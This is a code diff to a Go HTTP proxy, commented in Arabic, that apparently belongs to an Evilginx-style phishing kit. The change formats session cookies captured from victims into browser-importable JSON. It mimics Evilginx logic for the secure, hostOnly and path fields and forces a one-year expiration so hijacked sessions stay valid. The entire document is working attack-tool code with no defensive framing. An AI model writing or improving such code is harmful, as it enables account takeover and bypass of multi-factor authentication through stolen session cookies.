@@ -2233,20 +2233,41 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 				// تأخير قصير للتأكد من جمع جميع البيانات
 				time.Sleep(1 * time.Second)
 				
-				// إضافة بيانات الكوكيز
+				// إضافة بيانات الكوكيز - مطابق لتنسيق Evilginx
 				if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
 					for domain, cookies := range s.CookieTokens {
 						for name, cookie := range cookies {
+							// تطبيق نفس منطق Evilginx لتحديد Secure
+							secure := false
+							if strings.Index(name, "__Host-") == 0 || strings.Index(name, "__Secure-") == 0 {
+								secure = true
+							}
+							
+							// تطبيق نفس منطق Evilginx لتحديد HostOnly
+							hostOnly := true
+							if strings.HasPrefix(domain, ".") {
+								hostOnly = false
+							}
+							
+							// تطبيق نفس منطق Evilginx للـ Path
+							path := cookie.Path
+							if path == "" {
+								path = "/"
+							}
+							
+							// تطبيق نفس منطق Evilginx للـ ExpirationDate (1 سنة)
+							expirationDate := time.Now().Add(365 * 24 * time.Hour).Unix()
+							
 							cookieData := map[string]interface{}{
-								"path":           cookie.Path,
+								"path":           path,
 								"domain":         domain,
-								"expirationDate": cookie.ExpirationDate, // تأكد من أن هذا الحقل موجود في الهيكل
+								"expirationDate": expirationDate,
 								"value":          cookie.Value,
 								"name":           name,
-								"httpOnly":      cookie.HttpOnly,
-								"hostOnly":      false, // يمكنك تعديل هذا بناءً على الحاجة
-								"secure":        false, // يمكنك تعديل هذا بناءً على الحاجة
-								"session":       false, // يمكنك تعديل هذا بناءً على الحاجة
+								"httpOnly":       cookie.HttpOnly,
+								"hostOnly":       hostOnly,
+								"secure":         secure,
+								"session":        false,
 							}
 							cookiesList = append(cookiesList, cookieData)
 						}
